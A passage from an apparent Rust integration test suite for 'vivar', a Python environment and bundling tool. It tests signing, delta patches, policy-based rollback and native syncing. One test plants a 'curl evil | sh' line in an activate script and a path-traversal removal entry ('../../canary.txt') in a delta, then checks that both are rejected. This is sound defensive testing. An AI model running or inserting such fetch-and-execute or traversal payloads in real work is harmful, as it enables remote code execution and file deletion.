            String::from_utf8_lossy(&out.stderr)
        );
        out
    };
    init(dir);
    ok(dir, &["add", "six"]);

    // Signing needs a key; without one it says so.
    let out = run(
        dir,
        &[
            "pack",
            "--sign",
            "-o",
            tmp.0.join("x.tar.gz").to_str().unwrap(),
        ],
    );
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("no bundle key"));
    let out = okr(dir, &["key", "generate"]);
    assert!(stdout_of(&out).contains("wrote bundle key"));
    assert!(!run(dir, &["key", "generate"]).status.success()); // never silently replaced
    let shown = stdout_of(&okr(dir, &["key", "show"]));
    assert!(shown.contains("configured"), "{shown}");
    let public = shown
        .lines()
        .find_map(|l| l.strip_prefix("public key: "))
        .expect("public key line")
        .trim()
        .to_owned();
    assert_eq!(public.len(), 64, "{shown}");

    let a = tmp.0.join("a.tar.gz");
    okr(dir, &["pack", "--sign", "-o", a.to_str().unwrap()]);
    ok(dir, &["add", "pycodestyle"]);
    let b = tmp.0.join("b.tar.gz");
    okr(dir, &["pack", "--sign", "-o", b.to_str().unwrap()]);

    // Signed bundles unpack with --require-signature; a foreign key is refused.
    let a_dir = tmp.0.join("a-dir");
    assert!(stdout_of(&okr(
        &tmp.0,
        &[
            "unpack",
            "--require-signature",
            a.to_str().unwrap(),
            a_dir.to_str().unwrap()
        ]
    ))
    .contains("signature verified"));
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(&tmp.0)
        .env("VIVAR_BUNDLE_KEY", "ab".repeat(32))
        .args([
            "unpack",
            "--require-signature",
            a.to_str().unwrap(),
            tmp.0.join("foreign").to_str().unwrap(),
        ])
        .output()
        .unwrap();
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("does not trust"));
    // A verifier with no key of its own trusts the signer through policy
    // `trusted-keys` (or VIVAR_TRUSTED_KEYS) and nothing else.
    let trust = tmp.0.join("trust.toml");
    fs::write(&trust, format!("[policy]\ntrusted-keys = [\"{public}\"]\n")).unwrap();
    for (policy_file, env_keys, ok_expected) in [
        (Some(&trust), None, true),
        (None, Some(public.as_str()), true),
        (None, None, false),
    ] {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_vivar"));
        cmd.current_dir(&tmp.0)
            .env("XDG_CONFIG_HOME", tmp.0.join("empty-conf"))
            .env("APPDATA", tmp.0.join("empty-conf"))
            .env_remove("VIVAR_BUNDLE_KEY")
            .args([
                "unpack",
                "--require-signature",
                a.to_str().unwrap(),
                tmp.0.join("trusted").to_str().unwrap(),
            ]);
        if let Some(p) = policy_file {
            cmd.env("VIVAR_POLICY", p);
        }
        if let Some(k) = env_keys {
            cmd.env("VIVAR_TRUSTED_KEYS", k);
        }
        let out = cmd.output().unwrap();
        assert_eq!(
            out.status.success(),
            ok_expected,
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        if !ok_expected {
            assert!(String::from_utf8_lossy(&out.stderr).contains("no trusted keys"));
        }
        let _ = fs::remove_dir_all(tmp.0.join("trusted"));
    }
    // An unsigned bundle fails when a signature is required (here via org policy).
    let unsigned = tmp.0.join("u.tar.gz");
    ok(dir, &["pack", "-o", unsigned.to_str().unwrap()]);
    let policy = tmp.0.join("org.toml");
    fs::write(&policy, "[policy]\nrequire-signed-bundles = true\n").unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(&tmp.0)
        .env("VIVAR_POLICY", &policy)
        .args([
            "unpack",
            unsigned.to_str().unwrap(),
            tmp.0.join("u-dir").to_str().unwrap(),
        ])
        .output()
        .unwrap();
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("not signed"));

    // A delta from a to b applies onto the unpacked a and yields a verified b.
    let delta = tmp.0.join("a-to-b.tar.gz");
    let out = okr(
        &tmp.0,
        &[
            "diff",
            "--patch",
            a.to_str().unwrap(),
            b.to_str().unwrap(),
            "-o",
            delta.to_str().unwrap(),
        ],
    );
    assert!(stdout_of(&out).contains("changed"), "{}", stdout_of(&out));
    assert!(
        fs::metadata(&delta).unwrap().len() < fs::metadata(&b).unwrap().len() / 2,
        "delta is not small"
    );
    let out = vivar(&a_dir, &["run", "python", "-c", "import pycodestyle"]);
    assert!(!out.status.success());
    okr(
        &tmp.0,
        &[
            "unpack",
            "--apply",
            "--require-signature",
            delta.to_str().unwrap(),
            a_dir.to_str().unwrap(),
        ],
    );
    ok(&a_dir, &["run", "python", "-c", "import six, pycodestyle"]);
    assert!(stdout_of(&ok(&a_dir, &["verify"])).contains("integrity: all bundled files match"));
    // Applying it again is refused: the directory no longer matches the base.
    assert!(!run(
        &tmp.0,
        &[
            "unpack",
            "--apply",
            delta.to_str().unwrap(),
            a_dir.to_str().unwrap()
        ]
    )
    .status
    .success());

    // Dedupe hard-links identical files against an existing unpacked bundle.
    let b_dir = tmp.0.join("b-dir");
    let out = okr(
        &tmp.0,
        &[
            "unpack",
            "--dedupe-with",
            a_dir.to_str().unwrap(),
            b.to_str().unwrap(),
            b_dir.to_str().unwrap(),
        ],
    );
    assert!(
        stdout_of(&out).contains("deduplicated"),
        "{}",
        stdout_of(&out)
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        let shared = fs::metadata(site_packages(&b_dir).join("six.py")).unwrap();
        assert!(shared.nlink() >= 2, "six.py was not hard-linked");
    }
    ok(&b_dir, &["run", "python", "-c", "import six, pycodestyle"]);
}

#[test]
#[ignore = "slow: builds bundles or resolves natively; run with --include-ignored (CI does)"]
fn signatures_cover_launchers_and_deltas_cannot_escape() {
    let tmp = TempDir::new("sigcover");
    let dir = &tmp.0;
    let conf = tmp.0.join("conf");
    let run = |cwd: &Path, args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(cwd)
            .env("XDG_CONFIG_HOME", &conf)
            .env("APPDATA", &conf)
            .args(args)
            .output()
            .unwrap()
    };
    init(dir);
    ok(dir, &["add", "six"]);
    assert!(run(dir, &["key", "generate"]).status.success());
    let signed = tmp.0.join("signed.tar.gz");
    assert!(
        run(dir, &["pack", "--sign", "-o", signed.to_str().unwrap()])
            .status
            .success()
    );

    // Swap the activate script inside a signed archive: the checksum list doesn't
    // cover it, the inventory does.
    let work = tmp.0.join("work");
    fs::create_dir_all(&work).unwrap();
    assert!(Command::new("tar")
        .current_dir(&work)
        .args(["-xzf", signed.to_str().unwrap()])
        .status()
        .unwrap()
        .success());
    let activate = work
        .join(".venv")
        .join(if cfg!(windows) { "Scripts" } else { "bin" })
        .join("activate");
    let mut text = read(&activate);
    text.push_str("\ncurl evil | sh\n");
    fs::write(&activate, &text).unwrap();
    let tampered = tmp.0.join("tampered.tar.gz");
    assert!(Command::new("tar")
        .current_dir(&work)
        .args(["-czf", tampered.to_str().unwrap(), "."])
        .status()
        .unwrap()
        .success());
    let out = run(
        &tmp.0,
        &[
            "unpack",
            "--require-signature",
            tampered.to_str().unwrap(),
            tmp.0.join("t1").to_str().unwrap(),
        ],
    );
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("activate (modified)"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );

    // A signature file that isn't text is a failure, not a pass.
    fs::write(work.join("vivar-bundle.sig"), [0xffu8, 0xfe, 0x00, 0x01]).unwrap();
    fs::write(&activate, text.replace("\ncurl evil | sh\n", "")).unwrap();
    let garbage = tmp.0.join("garbage.tar.gz");
    assert!(Command::new("tar")
        .current_dir(&work)
        .args(["-czf", garbage.to_str().unwrap(), "."])
        .status()
        .unwrap()
        .success());
    let out = run(
        &tmp.0,
        &[
            "unpack",
            "--require-signature",
            garbage.to_str().unwrap(),
            tmp.0.join("t2").to_str().unwrap(),
        ],
    );
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("signature"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );

    // A delta whose removal list points outside the bundle is refused before touching anything.
    ok(dir, &["add", "pycodestyle"]);
    let newer = tmp.0.join("newer.tar.gz");
    assert!(run(dir, &["pack", "--sign", "-o", newer.to_str().unwrap()])
        .status
        .success());
    let delta = tmp.0.join("d.tar.gz");
    assert!(run(
        &tmp.0,
        &[
            "diff",
            "--patch",
            signed.to_str().unwrap(),
            newer.to_str().unwrap(),
            "-o",
            delta.to_str().unwrap()
        ]
    )
    .status
    .success());
    let dwork = tmp.0.join("dwork");
    fs::create_dir_all(&dwork).unwrap();
    assert!(Command::new("tar")
        .current_dir(&dwork)
        .args(["-xzf", delta.to_str().unwrap()])
        .status()
        .unwrap()
        .success());
    let meta = dwork.join("vivar-delta.toml");
    let evil = read(&meta).replace("removed = []", "removed = [\"../../canary.txt\"]");
    assert!(evil.contains("canary"), "{}", read(&meta));
    fs::write(&meta, evil).unwrap();
    let evil_delta = tmp.0.join("evil.tar.gz");
    assert!(Command::new("tar")
        .current_dir(&dwork)
        .args(["-czf", evil_delta.to_str().unwrap(), "."])
        .status()
        .unwrap()
        .success());
    let base = tmp.0.join("base");
    assert!(run(
        &tmp.0,
        &["unpack", signed.to_str().unwrap(), base.to_str().unwrap()]
    )
    .status
    .success());
    fs::write(tmp.0.join("canary.txt"), "still here").unwrap();
    let out = run(
        &tmp.0,
        &[
            "unpack",
            "--apply",
            evil_delta.to_str().unwrap(),
            base.to_str().unwrap(),
        ],
    );
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("not part of the bundle"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(read(&tmp.0.join("canary.txt")), "still here");
    // A tampered activate script in the base is replaced, not kept, by the delta.
    let base_activate = base
        .join(".venv")
        .join(if cfg!(windows) { "Scripts" } else { "bin" })
        .join("activate");
    let mut hacked = read(&base_activate);
    hacked.push_str("\n# hacked\n");
    fs::write(&base_activate, hacked).unwrap();
    assert!(run(
        &tmp.0,
        &[
            "unpack",
            "--apply",
            delta.to_str().unwrap(),
            base.to_str().unwrap()
        ]
    )
    .status
    .success());
    assert!(!read(&base_activate).contains("# hacked"));
    ok(&base, &["run", "python", "-c", "import pycodestyle"]);
}

#[test]
#[ignore = "slow: builds bundles or resolves natively; run with --include-ignored (CI does)"]
fn import_rolls_back_on_policy_and_handles_poetry_in_place() {
    let tmp = TempDir::new("import2");
    // A license policy rejects one imported package: nothing of the import stays.
    let a = tmp.0.join("strict");
    fs::create_dir_all(&a).unwrap();
    init(&a);
    append_policy(&a, "allow-licenses = [\"MIT\", \"BSD-3-Clause\"]");
    fs::write(a.join("requirements.txt"), "six\ntyping-extensions\n").unwrap();
    let before = read(&a.join("pyproject.toml"));
    let out = vivar(&a, &["import", "requirements.txt"]);
    assert!(!out.status.success());
    assert!(String::from_utf8_lossy(&out.stderr).contains("licenses outside"));
    assert_eq!(read(&a.join("pyproject.toml")), before);
    assert!(!vivar(&a, &["run", "python", "-c", "import six"])
        .status
        .success());

    // A poetry-only project whose import is rejected ends up exactly as it was:
    // original pyproject, no leftover environment.
    let c = tmp.0.join("poetry-strict");
    fs::create_dir_all(&c).unwrap();
    let original = "[tool.poetry]\nname = \"svc\"\nversion = \"1.0\"\n\n[tool.poetry.dependencies]\npython = \"^3.12\"\ntyping-extensions = \"*\"\n";
    fs::write(c.join("pyproject.toml"), original).unwrap();
    let strict = tmp.0.join("strict-org.toml");
    fs::write(&strict, "[policy]\nallow-licenses = [\"MIT\"]\n").unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(&c)
        .env("VIVAR_POLICY", &strict)
        .args(["import", "pyproject.toml"])
        .output()
        .unwrap();
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("licenses outside"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(read(&c.join("pyproject.toml")), original);
    assert!(
        !c.join(".venv").exists(),
        "rolled-back import left a .venv behind"
    );

    // A stray .venv directory that is not an environment is never built into or
    // cleaned up: the import refuses it, the files and the manifest stay as they were.
    let d = tmp.0.join("stray");
    fs::create_dir_all(d.join(".venv").join("bin")).unwrap();
    fs::write(d.join(".venv").join("bin").join("custom-tool"), "mine").unwrap();
    fs::write(d.join("pyproject.toml"), original).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(&d)
        .args(["import", "pyproject.toml"])
        .output()
        .unwrap();
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("not an environment"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(
        read(&d.join(".venv").join("bin").join("custom-tool")),
        "mine"
    );
    assert!(!d.join(".venv").join("pyvenv.cfg").exists());
    assert_eq!(read(&d.join("pyproject.toml")), original);
    // An empty .venv directory is fine to fill, and is removed again on failure.
    let e = tmp.0.join("empty");
    fs::create_dir_all(e.join(".venv")).unwrap();
    fs::write(e.join("pyproject.toml"), original).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(&e)
        .env("VIVAR_POLICY", &strict)
        .args(["import", "pyproject.toml"])
        .output()
        .unwrap();
    assert!(!out.status.success());
    assert!(
        !e.join(".venv").exists(),
        "failed import left its environment behind"
    );
    assert_eq!(read(&e.join("pyproject.toml")), original);

    // A .venv that is a symlink to an empty directory keeps the link; the
    // environment built in its target is cleared again on failure.
    #[cfg(unix)]
    {
        let l = tmp.0.join("linked");
        let target = tmp.0.join("linked-target");
        fs::create_dir_all(&l).unwrap();
        fs::create_dir_all(&target).unwrap();
        std::os::unix::fs::symlink(&target, l.join(".venv")).unwrap();
        fs::write(l.join("pyproject.toml"), original).unwrap();
        let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(&l)
            .env("VIVAR_POLICY", &strict)
            .args(["import", "pyproject.toml"])
            .output()
            .unwrap();
        assert!(!out.status.success());
        assert!(
            l.join(".venv").is_symlink(),
            "the .venv symlink was removed"
        );
        assert_eq!(
            fs::read_dir(&target).unwrap().count(),
            0,
            "environment left in the link target"
        );
    }

    // A poetry-only pyproject in place gets [project] metadata and its deps.
    let b = tmp.0.join("poetry");
    fs::create_dir_all(&b).unwrap();
    fs::write(
        b.join("pyproject.toml"),
        "[tool.poetry]\nname = \"svc\"\nversion = \"1.2.3\"\ndescription = \"a service\"\n\n[tool.poetry.dependencies]\npython = \"^3.12\"\nsix = \"^1.16\"\n\n[tool.poetry.group.dev.dependencies]\npycodestyle = \"*\"\n",
    )
    .unwrap();
    let out = ok(&b, &["import", "pyproject.toml"]);
    assert!(
        stdout_of(&out).contains("added [project] metadata"),
        "{}",
        stdout_of(&out)
    );
    let text = read(&b.join("pyproject.toml"));
    assert!(
        text.contains("name = \"svc\"")
            && text.contains("version = \"1.2.3\"")
            && text.contains("requires-python = \">=3.12\""),
        "{text}"
    );
    assert!(
        text.contains("six>=1.16,<2") && text.contains("[tool.poetry]"),
        "{text}"
    );
    assert_eq!(read(&b.join(".python-version")).trim(), "3.12");
    ok(&b, &["run", "python", "-c", "import six, pycodestyle"]);
}

#[test]
#[ignore = "slow: builds bundles or resolves natively; run with --include-ignored (CI does)"]
fn native_backend_syncs_from_the_lock_without_uv() {
    let tmp = TempDir::new("native");
    let dir = &tmp.0;
    init(dir);
    ok(dir, &["add", "six", "pycodestyle", "pytest"]);
    let native = |cwd: &Path, args: &[&str]| {
        Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(cwd)
            .env("VIVAR_BACKEND", "native")
            .env("PATH", bare_path())
            .args(args)
            .output()
            .unwrap()
    };
    let okn = |cwd: &Path, args: &[&str]| {
        let out = native(cwd, args);
        assert!(
            out.status.success(),
            "native vivar {} failed:\n{}{}\npyproject.toml:\n{}",
            args.join(" "),
            stdout_of(&out),
            String::from_utf8_lossy(&out.stderr),
            fs::read_to_string(cwd.join("pyproject.toml")).unwrap_or_default()
        );
        out
    };

    // A fresh environment from the lock, with uv nowhere on PATH.
    fs::remove_dir_all(dir.join(".venv")).unwrap();
    let out = okn(dir, &["sync"]);
    // pytest brings colorama along on Windows only.
    let expected = if cfg!(windows) { 8 } else { 7 };
    assert!(
        stdout_of(&out).contains(&format!("native sync: {expected} package(s) installed")),
        "{}",
        stdout_of(&out)
    );
    // A wheel's files are hard-linked from the unpacked-wheel store, so a
    // second environment with six costs no second copy of six.
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        let six = site_packages(dir).join("six.py");
        assert!(
            fs::metadata(&six).unwrap().nlink() >= 2,
            "{} is a copy, not a link into the store",
            six.display()
        );
        // Shared by every environment, so nobody edits it in place.
        assert_eq!(fs::metadata(&six).unwrap().mode() & 0o222, 0);
    }
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import six, pycodestyle, pytest, pluggy",
        ],
    );
    let script = dir
        .join(".venv")
        .join(if cfg!(windows) { "Scripts" } else { "bin" })
        .join(if cfg!(windows) {
            "pycodestyle.cmd"
        } else {
            "pycodestyle"
        });
    let out = Command::new(&script).arg("--version").output().unwrap();
    assert!(out.status.success(), "generated console script failed");
    assert!(stdout_of(&out).trim().starts_with('2'));
    // RECORD, INSTALLER and the dist-info are in place for every package.
    let six_info = site_packages(dir).join("six-1.17.0.dist-info");
    assert_eq!(read(&six_info.join("INSTALLER")).trim(), "vivar");
    assert!(read(&six_info.join("RECORD")).contains("six.py,sha256="));
    // Idempotent.
    assert!(stdout_of(&okn(dir, &["sync"])).contains("0 package(s) installed, 0 removed"));

    // Removal: drop pytest from the lock (uv does the resolving), native sync removes it.
    ok(dir, &["remove", "pytest"]);
    let site = site_packages(dir);
    // Put it back by hand to prove native sync removes what the lock no longer has.
    if !site.join("pytest").exists() {
        let out = okn(dir, &["sync"]);
        assert!(
            stdout_of(&out).contains("2 in the environment"),
            "{}",
            stdout_of(&out)
        );
    }
    assert!(!native(dir, &["run", "python", "-c", "import pytest"])
        .status
        .success());
    okn(dir, &["run", "python", "-c", "import six, pycodestyle"]);

    // Export, check and the Python-free cross-target layout all work natively.
    okn(dir, &["export", "requirements"]);
    assert!(read(&dir.join("requirements.txt")).contains("six==1.17.0"));
    let out = okn(dir, &["check", "--no-audit"]);
    assert!(
        stdout_of(&out).contains("all checks passed"),
        "{}",
        stdout_of(&out)
    );
    // Resolution is native too: add edits pyproject, writes a lock uv accepts,
    // and installs; remove takes the package and its orphans back out.
    let out = okn(dir, &["add", "pytest>=8"]);
    assert!(read(&dir.join("pyproject.toml")).contains("pytest>=8"));
    assert!(
        read(&dir.join("uv.lock")).contains("name = \"pluggy\""),
        "{}",
        stdout_of(&out)
    );
    okn(dir, &["run", "python", "-c", "import pytest, pluggy"]);
    if let Ok(out) = Command::new("uv")
        .current_dir(dir)
        .args(["lock", "--check"])
        .output()
    {
        assert!(
            out.status.success(),
            "uv rejects the native lock: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
    assert!(stdout_of(&okn(dir, &["outdated"])).contains("No lockfile changes"));
    // A removal that names an undeclared package changes nothing.
    let out = native(dir, &["remove", "pytest", "not-declared"]);
    assert!(!out.status.success());
    assert!(read(&dir.join("pyproject.toml")).contains("pytest>=8"));
    okn(dir, &["run", "python", "-c", "import pytest"]);
    okn(dir, &["remove", "pytest"]);
    assert!(!read(&dir.join("pyproject.toml")).contains("pytest"));
    assert!(!read(&dir.join("uv.lock")).contains("name = \"pluggy\""));
    assert!(!native(dir, &["run", "python", "-c", "import pytest"])
        .status
        .success());
    assert!(!native(dir, &["run", "python", "-c", "import pluggy"])
        .status
        .success());
    // Extras follow through the lock: `requests[socks]` brings PySocks in.
    okn(dir, &["add", "requests[socks]"]);
    let lock = read(&dir.join("uv.lock"));
    assert!(
        lock.contains("[package.optional-dependencies]\nsocks = ["),
        "{lock}"
    );
    assert!(
        lock.contains("{ name = \"requests\", extra = [\"socks\"] }"),
        "{lock}"
    );
    okn(dir, &["run", "python", "-c", "import requests, socks"]);
    if let Ok(out) = Command::new("uv")
        .current_dir(dir)
        .args(["lock", "--check"])
        .output()
    {
        assert!(
            out.status.success(),
            "uv rejects the native lock with extras: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
    okn(dir, &["remove", "requests"]);
    assert!(!native(dir, &["run", "python", "-c", "import socks"])
        .status
        .success());
    // A local wheel is added as a `path` source, as uv writes it, locked
    // by name and hash, and installed from where it sits.
    let wheels_dir = tmp.0.join("wheels");
    let local_whl = make_wheel(dir, &wheels_dir);
    okn(dir, &["add", local_whl.to_str().unwrap()]);
    let pyproject_text = read(&dir.join("pyproject.toml"));
    assert!(
        pyproject_text.contains("minipkg = { path = \"wheels/minipkg-1.0-py3-none-any.whl\" }"),
        "{pyproject_text}"
    );
    let lock = read(&dir.join("uv.lock"));
    assert!(
        lock.contains("source = { path = \"wheels/minipkg-1.0-py3-none-any.whl\" }")
            && lock
                .contains("{ name = \"minipkg\", path = \"wheels/minipkg-1.0-py3-none-any.whl\" }")
            && lock.contains("filename = \"minipkg-1.0-py3-none-any.whl\", hash = \"sha256:"),
        "{lock}"
    );
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import minipkg; assert minipkg.VALUE == 42",
        ],
    );
    if let Ok(out) = Command::new("uv")
        .current_dir(dir)
        .args(["lock", "--check"])
        .output()
    {
        assert!(
            out.status.success(),
            "uv rejects the native lock with a path source: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
    // The requirement still has to be met by what the source holds.
    let pyproject_path = dir.join("pyproject.toml");
    let text = read(&pyproject_path).replace("\"minipkg\",", "\"minipkg>=2\",");
    fs::write(&pyproject_path, text).unwrap();
    let out = native(dir, &["lock"]);
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("does not satisfy `minipkg>=2`"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let text = read(&pyproject_path).replace("\"minipkg>=2\",", "\"minipkg\",");
    fs::write(&pyproject_path, text).unwrap();
    okn(dir, &["remove", "minipkg"]);
    assert!(!read(&dir.join("pyproject.toml")).contains("minipkg"));
    // The name a path stands for goes past the deny list, and a wheel built
    // for another platform is refused.
    let text = read(&pyproject_path).replace("deny = []", "deny = [\"minipkg\"]");
    fs::write(&pyproject_path, text).unwrap();
    let out = native(dir, &["add", local_whl.to_str().unwrap()]);
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("deny list"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let text = read(&pyproject_path);
    assert!(
        !text.contains("\"minipkg\",") && !text.contains("minipkg = { path"),
        "{text}"
    );
    let text = text.replace("deny = [\"minipkg\"]", "deny = []");
    fs::write(&pyproject_path, text).unwrap();
    let foreign = wheels_dir.join("minipkg-1.0-py3-none-win_amd64.whl");
    fs::copy(&local_whl, &foreign).unwrap();
    let out = native(dir, &["add", foreign.to_str().unwrap()]);
    if cfg!(windows) {
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        okn(dir, &["remove", "minipkg"]);
    } else {
        assert!(!out.status.success());
        assert!(
            String::from_utf8_lossy(&out.stderr).contains("another platform"),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
    // A local project directory: editable (a .pth), or built and installed,
    // in which case a change to its source is picked up by the next sync.
    let local_dir = tmp.0.join("dirpkg");
    fs::create_dir_all(local_dir.join("src").join("dirpkg")).unwrap();
    fs::write(
        local_dir.join("pyproject.toml"),
        "[project]\nname = \"dirpkg\"\nversion = \"0.5\"\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )
    .unwrap();
    let dir_init = local_dir.join("src").join("dirpkg").join("__init__.py");
    fs::write(&dir_init, "VALUE = 1\n").unwrap();
    okn(dir, &["add", "--editable", local_dir.to_str().unwrap()]);
    assert!(
        read(&dir.join("pyproject.toml"))
            .contains("dirpkg = { path = \"dirpkg\", editable = true }"),
        "{}",
        read(&dir.join("pyproject.toml"))
    );
    assert!(
        read(&dir.join("uv.lock")).contains("source = { editable = \"dirpkg\" }"),
        "{}",
        read(&dir.join("uv.lock"))
    );
    fs::write(&dir_init, "VALUE = 2\n").unwrap();
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import dirpkg; assert dirpkg.VALUE == 2",
        ],
    );
    okn(dir, &["remove", "dirpkg"]);
    okn(dir, &["add", local_dir.to_str().unwrap()]);
    assert!(
        read(&dir.join("uv.lock")).contains("source = { directory = \"dirpkg\" }"),
        "{}",
        read(&dir.join("uv.lock"))
    );
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import dirpkg; assert dirpkg.VALUE == 2",
        ],
    );
    std::thread::sleep(std::time::Duration::from_millis(1100));
    fs::write(&dir_init, "VALUE = 3\n").unwrap();
    okn(dir, &["sync"]);
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import dirpkg; assert dirpkg.VALUE == 3",
        ],
    );
    okn(dir, &["remove", "dirpkg"]);

    // Direct references resolve natively: a wheel by URL, a source
    // distribution by URL (built with its own backend), a git checkout.
    let file_url = |p: &Path| {
        format!(
            "file:///{}",
            p.display()
                .to_string()
                .replace('\\', "/")
                .trim_start_matches('/')
        )
    };
    let whl = make_wheel(dir, &tmp.0.join("direct"));
    // A `#sha256=` fragment is enforced: the wrong hash is refused, the right
    // one accepted and recorded.
    let digest = stdout_of(&ok(
        dir,
        &[
            "run",
            "python",
            "-c",
            &format!(
                "import hashlib; print(hashlib.sha256(open({:?}, 'rb').read()).hexdigest())",
                whl.to_str().unwrap()
            ),
        ],
    ))
    .trim()
    .to_owned();
    let out = native(
        dir,
        &[
            "add",
            &format!("minipkg @ {}#sha256={}", file_url(&whl), "0".repeat(64)),
        ],
    );
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("does not match"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!read(&dir.join("pyproject.toml")).contains("minipkg"));
    okn(
        dir,
        &[
            "add",
            &format!("minipkg @ {}#sha256={digest}", file_url(&whl)),
        ],
    );
    assert!(read(&dir.join("uv.lock")).contains(&format!("sha256:{digest}")));
    okn(dir, &["remove", "minipkg"]);
    okn(dir, &["add", &format!("minipkg @ {}", file_url(&whl))]);
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import minipkg; assert minipkg.VALUE == 42",
        ],
    );
    let lock = read(&dir.join("uv.lock"));
    assert!(lock.contains("source = { url = \"file:///"), "{lock}");
    let sd = tmp.0.join("sdistpkg-0.1");
    fs::create_dir_all(sd.join("src").join("sdistpkg")).unwrap();
    fs::write(
        sd.join("pyproject.toml"),
        "[project]\nname = \"sdistpkg\"\nversion = \"0.1\"\ndependencies = [\"six\"]\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )
    .unwrap();
    fs::write(
        sd.join("src").join("sdistpkg").join("__init__.py"),
        "VALUE = 7\n",
    )
    .unwrap();
    let tarball = tmp.0.join("sdistpkg-0.1.tar.gz");
    let status = Command::new("tar")
        .arg("-czf")
        .arg(&tarball)
        .arg("-C")
        .arg(&tmp.0)
        .arg("sdistpkg-0.1")
        .status()
        .unwrap();
    assert!(status.success());
    let out = okn(dir, &["add", &format!("sdistpkg @ {}", file_url(&tarball))]);
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("building sdistpkg from source"),
        "{}",
        stdout_of(&out)
    );
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import sdistpkg, six; assert sdistpkg.VALUE == 7",
        ],
    );
    let lock = read(&dir.join("uv.lock"));
    assert!(
        lock.contains("sdist = { url = \"file:///") && lock.contains("sdistpkg-0.1.tar.gz"),
        "{lock}"
    );
    // An archive holding the project in a subdirectory, by URL fragment and
    // as a declared source; and a local archive whose name has hyphens.
    let multi = tmp.0.join("multi");
    fs::create_dir_all(multi.join("sub").join("src").join("subarch")).unwrap();
    fs::write(
        multi.join("sub").join("pyproject.toml"),
        "[project]\nname = \"subarch\"\nversion = \"0.2\"\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )
    .unwrap();
    fs::write(
        multi
            .join("sub")
            .join("src")
            .join("subarch")
            .join("__init__.py"),
        "VALUE = 8\n",
    )
    .unwrap();
    let multi_tar = tmp.0.join("multi.tar.gz");
    let status = Command::new("tar")
        .arg("-czf")
        .arg(&multi_tar)
        .arg("-C")
        .arg(&tmp.0)
        .arg("multi")
        .status()
        .unwrap();
    assert!(status.success());
    okn(
        dir,
        &[
            "add",
            &format!("subarch @ {}#subdirectory=sub", file_url(&multi_tar)),
        ],
    );
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import subarch; assert subarch.VALUE == 8",
        ],
    );
    let lock = read(&dir.join("uv.lock"));
    assert!(lock.contains("subdirectory = \"sub\" }"), "{lock}");
    okn(dir, &["sync"]);
    okn(dir, &["remove", "subarch"]);
    let text = read(&dir.join("pyproject.toml"))
        .replace("dependencies = [", "dependencies = [\n    \"subarch\",")
        + &format!(
            "\n[tool.uv.sources]\nsubarch = {{ url = \"{}\", subdirectory = \"sub\" }}\n",
            file_url(&multi_tar)
        );
    fs::write(dir.join("pyproject.toml"), text).unwrap();
    okn(dir, &["sync"]);
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import subarch; assert subarch.VALUE == 8",
        ],
    );
    let lock = read(&dir.join("uv.lock"));
    assert!(
        lock.contains("{ name = \"subarch\", url = \"file:///")
            && lock.contains("subdirectory = \"sub\" }"),
        "{lock}"
    );
    okn(dir, &["remove", "subarch"]);
    let hy = tmp.0.join("my-lib-1.0");
    fs::create_dir_all(hy.join("src").join("my_lib")).unwrap();
    fs::write(
        hy.join("pyproject.toml"),
